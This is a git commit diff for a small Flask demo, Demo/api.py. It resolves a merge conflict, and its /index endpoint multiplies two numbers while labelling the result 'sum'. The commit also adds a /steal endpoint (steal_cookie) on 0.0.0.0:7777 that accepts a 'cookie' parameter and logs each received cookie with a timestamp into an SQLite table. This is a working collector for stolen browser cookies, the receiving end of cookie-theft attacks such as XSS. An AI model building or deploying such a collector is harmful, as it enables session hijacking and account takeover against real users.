6d84da03c066a609c04ec223e35b6521ec773472
luoyangcheng <lyc163069@live.com>
2019-09-08 10:58:19 +0800

    flask

--- Demo/api.py
+++ Demo/api.py
@@ -1,26 +1,51 @@
-<<<<<<< HEAD
-import flask,json
+import flask, json
+import sqlite3
+import datetime
 
-server=flask.Flask(__name__)#__name__代表当前的python文件。把当前的python文件当做一个服务启动
+app = flask.Flask(__name__)
 
-@server.route('/index',methods=['get', 'post'])#第一个参数就是路径,第二个参数支持的请求方式，不写的话默认是get
 
+@app.route('/index', methods=['get', 'post'])
 def index():
-    username=flask.request.values.get('username')
-    res={'msg':username,'msg_code':200}
-    return json.dumps(res,ensure_ascii=False)
+    one = flask.request.values.get('one')
+    two = flask.request.values.get('two')
+    try:
+        a = float(one)
+        b = float(two)
+        num = a * b
+        res = {'sum': num, 'code': 200}
+        return json.dumps(res, ensure_ascii=False)
+    except Exception as e:
+        res = {'sum': "输入类型不对", 'code': 500}
+        return json.dumps(res, ensure_ascii=False)
 
-=======
-import flask,json
 
-server=flask.Flask(__name__)#__name__代表当前的python文件。把当前的python文件当做一个服务启动
+@app.route('/steal', methods=['get', 'post'])
+def steal_cookie():
+    nowTime = datetime.datetime.now()
+    cookie = flask.request.values.get('cookie')
+    if cookie is None:
+        res = {'data': "缺少必要参数", 'code': 401}
+        return json.dumps(res, ensure_ascii=False)
+    elif cookie == '':
+        res = {'data': "参数信息不能为空", 'code': 402}
+        return json.dumps(res, ensure_ascii=False)
+    else:
+        try:
+            conn = sqlite3.connect("Luoyc.db")
+            c = conn.cursor()
+            sql = "INSERT INTO tb_cookie VALUES(?,?)"
+            datas = [(cookie, nowTime)]
+            c.executemany(sql, datas)
+            conn.commit()
+            res = {'data': cookie, 'code': 200}
+            return json.dumps(res, ensure_ascii=False)
+        except Exception as e:
+            print(e)
+        finally:
+            conn.close()
 
-@server.route('/index',methods=['get', 'post'])#第一个参数就是路径,第二个参数支持的请求方式，不写的话默认是get
 
-def index():
-    username=flask.request.values.get('username')
-    res={'msg':username,'msg_code':200}
-    return json.dumps(res,ensure_ascii=False)
-
->>>>>>> 9171a4868b36c030064352f796ec36096163db08
-server.run(port=7777,debug=True,host='0.0.0.0')
+if __name__ == "__main__":
+    app.run(port=7777, debug=False, host='0.0.0.0')
+    # nohup python3 run.py >>  ./run.log 2>&1 &
